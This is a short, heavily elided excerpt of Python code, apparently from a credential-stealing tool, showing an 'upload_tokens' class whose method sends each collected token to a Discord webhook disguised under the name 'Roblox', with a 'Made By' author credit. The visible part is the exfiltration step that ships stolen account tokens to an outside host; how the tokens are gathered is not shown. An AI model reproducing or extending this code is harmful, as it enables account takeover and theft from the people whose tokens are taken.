...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="Made By yaccobs#1903")

            self.webhook.send(embed=embed, username="Roblox", avatar_url="https://cdn.discordapp.com/icons/1075488706124841010/6230b5faaf74dc6f756c6eeef7b76b26.png?size=256")
